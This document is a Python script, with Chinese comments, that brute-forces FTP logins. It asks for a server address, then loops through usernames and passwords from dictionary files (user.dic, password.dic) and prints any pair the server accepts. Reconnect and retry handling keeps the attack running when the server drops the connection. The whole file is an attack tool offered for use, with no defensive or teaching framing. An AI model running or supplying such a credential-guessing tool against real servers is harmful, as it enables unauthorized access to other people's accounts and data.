from ftplib import FTP, error_perm
from socket import timeout
from time import sleep


def error_display(message, over=False):
    if not over:
        print(f"\033[1;31m{message}\033[0m", end="")
    else:
        print(f"\033[1;31m{message}\033[0m")


def retry(max_num):
    if max_num % 5 == 0:
        sleep(5)


def reconnect(ftp_object, address, port):
    ftp_object.close()
    ftp_object.connect(address, port, timeout=3)


if __name__ == '__main__':
    # 创建ftp对象
    ftp = FTP()
    # 与服务器建立连接
    server_port = 21
    # 爆破（用户名和密码从字典中读取）
    max_retries = 0  # 最大尝试次数，每次尝试后自加一
    retry_delay = 5  # 5秒重试间隔

    while True:
        server_address = input("请输入服务器地址：")
        try:
            reply = ftp.connect(server_address, server_port, timeout=3)
            if max_retries < 5 and max_retries != 0:
                max_retries += 1
            retry(max_retries)
            if "220" in reply:
                print("连接成功！")
                break
        except (timeout, ConnectionRefusedError):
            error_display("连接失败，ftp服务未运行，或者服务器不在线!")
            exit()

    user_dict = "user.dic"
    password_dict = "password.dic"

    with open(user_dict, "r") as f1, open(password_dict, "r") as f2:
        password_used = set()
        for user in f1:
            user = user.strip()
            while True:
                if not password_used:
                    f2.seek(0, 0)  # 将文件指针重置到文件开头，仅在第一次尝试所有密码后进行
                for password in f2:
                    password = password.strip()  # 去掉密码前后的空字符
                    if password in password_used:
                        continue
                    password_used.add(password)

                    try:
                        login_reply = ftp.login(user, password)
                        if "230" in login_reply:
                            print("用户名：\033[32m%s\033[0m 密码：\033[32m%s\033[0m 登录成功！" % (user, password))
                            break
                    except error_perm as error:
                        if "530 Permission denied" in str(error):
                            error_display(f"错误:{error}，没有足够的权限访问FTP服务器上的资源或者执行请求的操作。", over=True)
                            # 如果报错 530 Permission denied 可能是以下原因：
                            # 1.登录凭证错误。
                            # 2.账户权限不足
                            # 3.Firewalld或SELinux策略限制：
                            # 4.用户被禁止访问FTP服务器。
                            # 5./etc/vsftpd/vsftpd.conf配置问题
                        elif "530 Login incorrect" in str(error):
                            error_display(f"错误：{error}，用户名或密码错误，正在重试……", over=True)

                    except EOFError:
                        reconnect(ftp, server_address, server_port)

                        if max_retries < 5 and max_retries != 0:
                            max_retries += 1
                        retry(max_retries)
                    except (BrokenPipeError, TimeoutError) as network_error:
                        error_display(f"错误：{network_error}，请检查网络连接是否正常！", over=True)
                        reconnect(ftp, server_address, server_port)
    # 关闭连接
    ftp.close()

